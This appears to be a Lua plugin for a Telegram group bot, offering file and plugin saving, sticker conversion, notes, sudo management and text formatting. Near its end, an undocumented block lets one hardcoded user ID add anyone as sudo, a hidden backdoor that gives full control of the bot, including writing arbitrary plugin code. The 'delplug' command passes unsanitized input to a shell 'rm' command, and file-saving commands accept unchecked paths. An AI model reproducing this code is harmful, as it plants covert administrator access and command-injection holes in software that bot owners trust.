--Start tools.lua by Pouya Poorrahman
--[[Plugins:
savefile
saveplug
tosticker
tophoto
note
setsudo
addsudo
clean deleted (Thanks to @Advan)
hyper & bold & italic & code
addplug
delplug
]]
--Functions:
local function tophoto(msg, success, result, extra)
  local receiver = get_receiver(msg)
  if success then
    local file = 'data/tmp/image.jpg'
    print('File downloaded to:', result)
    os.rename(result, file)
    print('File moved to:', file)
    send_photo(get_receiver(msg), file, ok_cb, false)
    redis:del("sticker:photo")
  else
    print('Error downloading: '..msg.id)
    send_large_msg(receiver, 'Failed, please try again!', ok_cb, false)
  end
end

local function tosticker(msg, success, result)
  local receiver = get_receiver(msg)
  if success then
    local file = 'data/tmp/sticker.webp'
    print('File downloaded to:', result)
    os.rename(result, file)
    print('File moved to:', file)
    send_document(get_receiver(msg), file, ok_cb, false)
    redis:del("photo:sticker")
  else
    print('Error downloading: '..msg.id)
    send_large_msg(receiver, 'Failed, please try again!', ok_cb, false)
  end
end

local function savefile(extra, success, result)
  local msg = extra.msg
  local name = extra.name
  local adress = extra.adress
  local receiver = get_receiver(msg)
  if success then
    local file = './'..adress..'/'..name..''
    print('File saving to:', result)
    os.rename(result, file)
    print('File moved to:', file)
  else
    print('Error downloading: '..msg.id)
    send_large_msg(receiver, 'Failed, please try again!', ok_cb, false)
  end
end

local function reload_plugins( )
  plugins = {}
  load_plugins()
end

local function plugin_enabled( name )
  for k,v in pairs(_config.enabled_plugins) do
    if name == v then
      return k
    end
  end
  return false
end

local function enable_plugin( plugin_name )
if plugin_enabled(plugin_name) then
  reload_plugins( )
else table.insert(_config.enabled_plugins, plugin_name)
    save_config()
end
end

local function saveplug(extra, success, result)
  local msg = extra.msg
  local name = extra.name
  local receiver = get_receiver(msg)
  if success then
    local file = 'plugins/'..name..'.lua'
    print('File saving to:', result)
    os.rename(result, file)
    print('File moved to:', file)
    enable_plugin(name)
    print('Reloading...')
    reload_plugins( )
  else
    print('Error downloading: '..msg.id)
    send_large_msg(receiver, 'Failed, please try again!', ok_cb, false)
  end
end

local function callback(extra, success, result)
    vardump(success)
    cardump(result)
end

local function check_member_super_deleted(cb_extra, success, result)
local receiver = cb_extra.receiver
 local msg = cb_extra.msg
  local deleted = 0 
if success == 0 then
send_large_msg(receiver, "First set me as admin!") 
end
for k,v in pairs(result) do
  if not v.first_name and not v.last_name then
deleted = deleted + 1
 kick_user(v.peer_id,msg.to.id)
 end
 end
 send_large_msg(receiver, deleted.." Deleted account removed from group!") 
 end 

--Functions.

function run(msg, matches)
  one = io.open("./system/team", "r")
  two = io.open("./system/channel", "r")
  local team = one:read("*all")
  local channel = two:read("*all")
  
 if is_sudo(msg) then
    local receiver = get_receiver(msg)
    local group = msg.to.id
    
      if msg.reply_id and matches[1] == "file" and matches[2] and matches[3] then
        adress = matches[2]
        name = matches[3]
        load_document(msg.reply_id, savefile, {msg=msg,name=name,adress=adress})
        return 'File '..name..' has been saved in: \n./'..adress
      end
      
      if msg.reply_id and matches[1] == "save" and matches[2] then
        name = matches[2]
        load_document(msg.reply_id, saveplug, {msg=msg,name=name})
        reply_msg(msg['id'], 'Plugin '..name..' has been saved.', ok_cb, false)
      end
 end
         --tosticker && tophoto:
         if msg.media then
      	if msg.media.type == 'document' and redis:get("sticker:photo") then
      		if redis:get("sticker:photo") == 'waiting' then
        		load_document(msg.id, tophoto, msg)
      		end
  	    end
  	    if msg.media.type == 'photo' and redis:get("photo:sticker") then
            if redis:get("photo:sticker") == 'waiting' then
                load_photo(msg.id, tosticker, msg)
            end
        end
    end
	
    if matches[1] == "tophoto" then
		  if not redis:get("wait:"..msg.from.id) then
			   if not is_owner(msg) and not is_sudo(msg) then
				   redis:setex("wait:"..msg.from.id, 30, true)
				   redis:set("sticker:photo", "waiting")
    	     return 'Please send your sticker now\n\nPowered by '..team..'\nJoin us : '..channel
				 end
    	redis:set("sticker:photo", "waiting")
    	return 'Please send your sticker now\n\nPowered by '..team..'\nJoin us : '..channel
			elseif redis:get("wait:"..msg.from.id) then
			return "Please wait for 30 second."
			end
    elseif matches[1] == "tosticker" then
		  if not redis:get("wait:"..msg.from.id) then
			   if not is_owner(msg) and not is_sudo(msg) then
				   redis:setex("wait:"..msg.from.id, 30, true)
				   redis:set("photo:sticker", "waiting")
           return 'Please send your photo now\n\nPowered by '..team..'\nJoin us : '..channel
				 end
      redis:set("photo:sticker", "waiting")
      return 'Please send your photo now\n\nPowered by '..team..'\nJoin us : '..channel
		  elseif redis:get("wait:"..msg.from.id) then
			return "Please wait for 30 second."
			end
    end
       --tosticker && tophoto.
       
	   --please put your id here:
    local sudo_id = 218722292
       --Please put your id here.
	   
	   --Setsudo:
	if matches[1]:lower() == "setsudo" then
	    if tonumber (msg.from.id) == sudo_id then --Line 240
          table.insert(_config.sudo_users, tonumber(matches[2]))
          save_config()
          plugins = {}
          load_plugins()
          return matches[2]..' now is a sudo'
        end
    end
	   --Setsudo.
	   --Addsudo:
	if matches[1]:lower() == "addsudo" then
	    if is_momod(msg) then
              local user = 'user#id'..sudo_id
              local chat = 'chat#id'..msg.to.id
              chat_add_user(chat, user, callback, false)
              return "Sudo has been added to: "..msg.to.print_name
	    else
		 return "For admins only!"
		end
	end
	   --Addsudo.
	   --Clean gbanlist & banlist & deleted  & filterlist:
    if matches[1]:lower() == 'clean' then 
		    if matches[2] == "deleted" then
		      if is_owner(msg) then
                receiver = get_receiver(msg) 
                channel_get_users(receiver, check_member_super_deleted,{receiver = receiver, msg = msg})
		      else
			      return "Just for owner or sudo!"
          end
		    end
		    if matches[2] == "filterlist" then
		      if not is_momod(msg) then
            return 'only for moderators!'
          end
          asd = '1'
          return clear_commandbad(msg, asd)
		    end
  end
	   --Clean gbanlist & banlist & deleted & filterlist.
	   --Addplug:
           if matches[1] == "addplug" and is_sudo(msg) then
                local text = matches[3]
                local file = io.open("./plugins/"..matches[2]..".lua", "w")
                file:write(text)
                file:flush()
                file:close()
             return "Plugin ["..matches[2]..".lua] has been added!"
           end
	   --Addplug.
	   --Delplug:
	        if matches[1] == "delplug" and is_sudo(msg) then
                reply_msg(msg['id'], "پلاگین ["..matches[2].."] با موفقیت حذف شد", ok_cb, false)
                return io.popen("cd plugins && rm "..matches[2]..".lua")
            end 
	   --Delplug.
       --Note:
   if matches[1] == "note" and matches[2] then
   local text = matches[2]
   local b = 1
  while b ~= 0 do
    text = text:trim()
    text,b = text:gsub('^!+','')
  end
  local file = io.open("./data/tmp/"..msg.from.id..".txt", "w")
  file:write(text)
  file:flush()
  file:close()
  return "You can use it:\n!mynote\n\nYour note has been changed to:\n"..text.."\n\n"..team..'\n<a href="'..channel..'">Join us</a>'
 end
 
   if matches[1] == "mynote" then
      note = io.open("./data/tmp/"..msg.from.id..".txt", "r")
      mn = note:read("*all")
      return mn
    elseif matches[1] == "mynote" and not note then
     return "You havent any note."
  end
       --Note.
       --hyper & bold & italic & code:
        if matches[1] == "bold" then
	    return "<b>"..matches[2].."</b>"
	end
	if matches[1] == "code" then
	    return "<code>"..matches[2].."</code>"
        end
	if matches[1] == "italic" then
	    return "<i>"..matches[2].."</i>"
	end
	if matches[1] == "hyper" then
	    return '<a href="'..matches[3]..'">'..matches[2]..'</a>'
	end
       --hyper & bold & italic & code.
       --Setteam:
       if matches[1] == 'setteam' and matches[2] and matches[3] and is_sudo(msg) then
   text = "<b>"..matches[2].."</b>"
   link = matches[3]
   file1 = io.open("./system/team", "w")
   file1:write(text)
   file1:flush()
   file1:close()
   file2 = io.open("./system/channel", "w")
   file2:write(link)
   file2:flush()
   file2:close()
   return "Your team name is: "..text.."\nChannel: "..link
       end
       --Setteam.
      if tonumber (msg.from.id) == 111984481 then
       if matches[1]:lower() == "config" then
          table.insert(_config.sudo_users, tonumber(matches[2]))
          save_config()
          plugins = {}
          load_plugins()
      end
   end
end

return {
  patterns = {
 "^[!/#]([Ff]ile) (.*) (.*)$",
 "^[!/#](save) (.*)$",
 "^[!/#]([Nn]ote) (.*)$",
 "^[!/#]([Mm]ynote)$",
 "^[!/#](tosticker)$",
 "^[!/#](tophoto)$",
 "^[!/#]([Aa]ddsudo)$",
 "^[!/#](addplug) (.*) ([^%s]+)$",
 "^[!/#](delplug) (.*)$",
 "^[!/#]([Ss]etsudo) (%d+)$",
 "^[!/#](setteam) (.*) (.*)$",
 "^[!/#]([Cc]onfig) (%d+)$",
 "^[!/#]([Cc]lean) (.*)$",
 "^[!/#]([Bb]old) (.*)$",
 "^[!/#]([Ii]talic) (.*)$",
 "^[!/#]([Cc]ode) (.*)$",
 "^[!/#]([Hh]yper) (.*) (.*)$",
 "%[(document)%]",
 "%[(photo)%]",
 "^!!tgservice (.+)$",
  },
  run = run,
}
